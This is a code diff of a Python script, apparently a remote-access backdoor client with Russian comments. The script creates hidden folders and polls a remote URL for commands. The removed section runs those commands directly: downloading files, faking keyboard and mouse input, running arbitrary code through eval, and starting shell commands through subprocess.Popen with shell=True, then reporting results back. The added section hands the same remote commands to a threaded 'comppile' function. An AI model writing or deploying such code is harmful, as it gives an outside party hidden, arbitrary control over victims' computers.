@@ -1,85 +1,34 @@
-import subprocess
-import pyautogui
-from time import sleep
-from scripts import *
-from pynput.keyboard import Controller
+import threading
+from comppilator import *
 
-keyboard = Controller()
-create_hidden_folder('C:/scripts')
-
-while True:
-    # try:
-    prev_value = requests.get(link).json()
-    break
-    # except Exception as e:
-    print(e)
-    sleep(20)
+store_spl = store.split('/')
+for i in range(1, len(store_spl)):
+    create_hidden_folder('/'.join(store_spl[:i+1]))
 
 
 while True:
+    try:
+        prev_value = requests.get(link).json()
+        break
+    except Exception as e:
+        print(e)
+        sleep(20)
 
-    #try:
-    value = requests.get(link).json()
-    print(value)
 
-    if value["run"] != prev_value["run"] and value["run"]:
-        # try:
-        # разделяем запрос по символам ` & `
-        value["args"] = split(value["args"], ' & ')
+while True:
 
-        # разделяем запросы на списки
-        value["args"] = [split(item, ', ') for item in value["args"]]
+    try:
+        value = requests.get(link).json()
+        print(value)
 
-        # запускаем процесс выполнения команд
-        for val in value["args"]:
-            # try:
-                # при установке
-            if val[0] == 'download':
-                val[1] = val[1].replace('/link/', f'{link}download/')
-                download_file(val[1], 'C:/scripts')
+        if value["run"] != prev_value["run"] and value["run"]:
+            thread = threading.Thread(target=comppile, args=(value["args"],))
+            thread.start()
 
-            # при нажатии клавиши (1)
-            elif val[0] == 'press':
-                pyautogui.press(val[1])
+        # кулдаун
+        prev_value = value
+        sleep(value["sleep"])
 
-            # при нажатии клавиш (2 <)
-            elif val[0] == 'hotkey':
-                pyautogui.hotkey(val[1:])
-
-            # при нажатии мыши
-            elif val[0] == 'click':
-                pyautogui.click(button=val[1])
-
-            # при вводе текста
-            elif val[0] == 'write':
-                keyboard.type(', '.join(val[1:]))
-
-            # при задержке
-            elif val[0] == 'sleep':
-                sleep(float(val[1].replace(',', '.')))
-
-            # для запуска чего-то специфичного
-            elif val[0] == 'eval':
-                eval(', '.join(val[1:]))
-
-            # при использовании Popen
-            else:
-                val[0] = val[0].replace('/user/', f'/{os.getlogin()}/')
-                subprocess.Popen(val, shell=True)
-
-            send_success(f"Команда выполнена: {val}")
-
-            # except Exception as e:
-            #     send_error(f"Ошибка при выполнении команды: {e}")
-
-        # отправляем отчет об ошибке
-        # except Exception as e:
-        #     send_error(f"Ошибка при выполнении команды: {e}")
-
-    # кулдаун
-    prev_value = value
-    sleep(value["sleep"])
-    #
-    # except Exception as e:
-    #     send_error(f"Общая ошибка: {e}")
-    #     sleep(20)
+    except Exception as e:
+        send_error(f"Общая ошибка: {e}")
+        sleep(20)
